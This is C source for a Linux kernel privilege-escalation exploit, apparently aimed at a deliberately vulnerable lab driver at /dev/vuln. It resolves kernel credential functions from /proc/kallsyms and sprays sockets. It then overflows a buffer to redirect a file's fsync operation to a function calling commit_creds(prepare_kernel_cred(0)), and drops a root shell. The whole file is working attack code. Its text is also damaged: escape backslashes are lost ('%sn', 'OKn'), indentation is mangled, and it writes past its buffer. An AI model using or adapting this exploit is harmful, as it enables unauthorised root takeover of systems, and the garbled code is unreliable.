#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>


#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <errno.h>
#define BUF_LEN 256
struct list_head
{
    struct list_head *prev,*next;
};
struct path
{
    void *mnt;
    void *dentry;
};
struct file_operations
{
    void *owner;
    void *llseek;
    void *read;
    void *write;
    void *aio_read;
    void *aio_write;
    void *readdir;
    void *poll;
    void *unlocked_ioctl;
    void *compat_ioctl;
    void *mmap;
    void *open;
    void *flush;
    void *release;
    void *fsync;
    void *aio_fsync;
    void *fasync;
    void *lock;
    void *sendpage;
    void *get_unmapped_area;
    void *check_flags;
    void *flock;
    void *splice_write;
    void *splice_read;
    void *setlease;
    void *fallocate;
    void *show_fdinfo;
} op;

struct file
{
    struct list_head fu_list;
    struct path f_path;
    struct file_operations *f_op;
    long int buf[1024];
} file;
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

int win=0;

static unsigned long get_kernel_sym(char *name)
{
    FILE *f;
    unsigned long addr;
    char dummy;
    char sname[512];
    struct utsname ver;
    int ret;
    int rep = 0;
    int oldstyle = 0;
    f = fopen("/proc/kallsyms", "r");
              if (f == NULL)
{
    f = fopen("/proc/ksyms", "r");
              if (f == NULL)
                  goto fallback;
                  oldstyle = 1;
    }
    repeat:
    ret = 0;
    while(ret != EOF)
{
    if (!oldstyle)
            ret = fscanf(f, "%p %c %sn", (void **)&addr, &dummy, sname);
                         else
            {
                ret = fscanf(f, "%p %sn", (void **)&addr, sname);
                             if (ret == 2)
            {
                char *p;
                if (strstr(sname, "_O/") || strstr(sname, "_S."))
                               continue;
                               p = strrchr(sname, '_');
                               if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
                                           p = p - 4;
                                           while (p > (char *)sname && *(p - 1) == '_')
                                               p--;
                                               *p = '0';
                        }
        }
}
        if (ret == 0)
{
    fscanf(f, "%sn", sname);
           continue;
}
if (!strcmp(name, sname))
{
    printf("[+] Resolved %s to %p%sn", name, (void *)addr, rep ? " (viaSystem.map)" : "");
           fclose(f);
           return addr;
}
}
fclose(f);
if (rep)
    return 0;
fallback:
uname(&ver);
if (strncmp(ver.release, "2.6", 3))
            oldstyle = 1;
            sprintf(sname, "/boot/System.map-%s", ver.release);
                    f = fopen(sname, "r");
                              if (f == NULL)
                                  return 0;
                                  rep = 1;
                                  goto repeat;
}
                        int getroot(void)
{
win=1;
commit_creds(prepare_kernel_cred(0));
    return -1;
}
int main(int argc,char ** argv)
{
    char *payload;
    int payload_len;
    void *ptr = &file;
    payload_len = 256+9;
    payload = malloc(payload_len);
    if(!payload)
    {
        perror("malloc");
               return -1;
    }
    memset(payload,'A',payload_len);
    memcpy(payload+256,&ptr,sizeof(ptr));
    payload[payload_len]=0;
    int fd = open("/dev/vuln",O_RDWR);
                  if(fd == -1)
{
    perror("open ");
           return -1;
}
commit_creds = (_commit_creds)get_kernel_sym("commit_creds");
               prepare_kernel_cred =(_prepare_kernel_cred)get_kernel_sym("prepare_kernel_cred");
                                    int i;
                                    for(i=0; i<1000; i++)
{
    if(socket(AF_INET,SOCK_STREAM,0) == -1)
        {
            perror("socket fill ");
                   return -1;
        }
    }
    write(fd,payload,payload_len);
    int target_fd ;
    target_fd = socket(AF_INET,SOCK_STREAM,0);
                target_fd = socket(AF_INET,SOCK_STREAM,0);
                file.f_op = &op;
                op.fsync = &getroot;
                fsync(target_fd);
                pid_t pid = fork();
                if (pid == 0)
{
    setsid( );
        while (1)
        {
            sleep(9999);
        }
    }
    printf("[+] rooting shell ...."); close(target_fd);
           if(win)
{
    printf("OKn[+] Droping root shell ... n");
           execl("/bin/sh","/bin/sh",NULL);
}
       else
           printf("FAIL n");
                  return 0;
}
